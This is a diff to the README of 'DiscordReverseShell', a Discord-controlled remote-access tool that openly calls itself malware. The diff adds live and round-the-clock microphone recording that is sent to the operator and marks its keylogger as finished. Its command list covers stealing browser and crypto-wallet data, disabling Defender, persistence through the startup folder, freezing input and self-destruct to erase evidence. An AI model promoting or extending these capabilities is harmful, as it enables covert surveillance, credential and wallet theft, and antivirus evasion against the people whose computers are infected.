@@ -13,7 +13,7 @@
 
 <h4 align="center">
     <span style="color: #fff; font-weight: bold;">DiscordReverseShell</span>
-    <span style="color: #fff; font-weight: normal;">v4.5.0</span>
+    <span style="color: #fff; font-weight: normal;">v5.0.0</span>
 <h4>
 
 ## Features
@@ -61,6 +61,10 @@
 - Startup
     - Creates shortcut to malware in `C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
 
+- Mic
+    - Live microphone
+    - 24/7 recordings 
+  
 - Other
     - Validating token
     - Checking internet
@@ -70,7 +74,7 @@
     - Defender disabler
     - Fake error
     - Self destruct and all 'evidence'
-    - Keylogger -- Still WIP, works but cant be stopped, only thru reboot or shutdown
+    - Keylogger
 
 
 ## Usage
@@ -118,7 +122,9 @@ Full list of commands for malware with description:
     startup - Add to startup
     browser - Get browser data
     wallet - Get wallet information
-    keylogger - Enable keylogger -- WIP -- !cant be stopped, only thru reboot or shutdown!
+    keylogger - Enable keylogger
+    mic - Record 120 seconds recordings of microphone and send them
+    join - Joins or leaves voice channel where it streams live microphone
     freeze <1/0> - Freeze all inputs from keyboard and mouse
     clone <path> - Clone the malware to the specified path, make sure to enter path whit name of the output file
     regedit <1 / 2 / 3> <key path> <value name> OR regedit 2 <key path> <value name> <value type: string / expandable_string / multi_string / dword / qword / binary> <value data> - Regedit: 1 - Show value, 2 - Create value, 3 - Delete value
